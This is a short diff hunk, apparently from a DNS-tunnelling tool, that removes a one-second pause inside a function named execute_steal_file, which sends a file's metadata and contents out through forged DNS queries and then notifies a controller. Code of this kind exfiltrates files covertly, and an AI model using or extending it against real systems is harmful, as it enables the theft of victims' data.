@@ -354,7 +354,6 @@ def execute_steal_file(filepath) -> bool:
     print("Sending file...")
     # Send meta data first.
     forge_dns_query_block(metadata, FILE_TRANSFER_IDENTIFICATION)
-    sleep(1)
     # Send the file.
     forge_dns_query_block(file_data.decode("utf-8"), FILE_TRANSFER_IDENTIFICATION)
     # Notify the controller
